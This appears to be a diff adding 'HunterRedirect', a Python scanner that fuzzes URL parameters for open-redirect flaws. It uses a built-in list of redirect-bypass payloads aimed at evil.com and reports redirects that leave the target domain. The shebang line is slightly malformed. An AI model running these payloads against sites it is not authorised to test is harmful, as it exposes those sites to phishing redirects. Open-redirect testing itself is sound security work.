@@ -1,0 +1,43 @@
+#/usr/bin/env python3
+import argparse, requests, certifi, sys, re
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+parser = argparse.ArgumentParser(description="HunterRedirect v0.0.1")
+parser.add_argument("-u", "--url", help="Set the target url (e.g http://example.com/?url=FUZZ)")
+parser.add_argument("-w", "--wordlist", help="Set wordlist")
+parser.add_argument("-c", "--concurrent", help="Set concurrent", type=int, default=20)
+parser.add_argument("-v", "--verbose", action="store_true", help="Verbose mode")
+args = parser.parse_args()
+
+verbose = args.verbose
+if not args.url:
+	target = sys.stdin.read().splitlines()
+else:
+	target = [args.url]
+
+domain_regex = r"(?i)^https?:\/\/([a-z0-9\-\.]+\.[a-z]{2,}|[a-z0-9\.\-]+:\d{1,5})"
+
+if not args.wordlist:
+	payloads = ["https://evil.com", "http://evil.com", "//evil.com", "///evil.com", "////evil.com", "https:evil.com", "http:evil.com", "/\\evil.com", "\\evil.com", "/\\/evil.com", "https:///evil.com", "//%2Fevil.com", "%2F%2Fevil.com", "%252F%252Fevil.com", "https%3A%2F%2Fevil.com", "http%3A%2F%2Fevil.com", "https://trusted.com@evil.com", "http://trusted.com@evil.com", "//trusted.com@evil.com", "///trusted.com@evil.com"]
+else:
+	try:payloads = open(args.wordlist, "r+").read().split()
+	except Exception as x:print(x)
+
+def verify_redirect(tgt):
+	target_domain = re.findall(domain_regex, tgt)
+	if not "FUZZ" in tgt: return
+	for payload in payloads:
+		try:
+			rdu = tgt.replace("FUZZ", payload)
+			r = requests.get(rdu)
+			domain_now = re.findall(domain_regex, r.url)
+			if domain_now != target_domain:
+				print(f"[FOUND REDIRECT] {rdu} ===> {r.url}")
+			else:
+				if verbose: print(f"[verbose] Not found: {rdu}", file=sys.stderr)
+		except Exception as x:
+			if verbose: print(f"[verbose]: {x}", file=sys.stderr)
+			pass
+
+with ThreadPoolExecutor(max_workers=args.concurrent) as executor:
+	executor.map(verify_redirect, target)
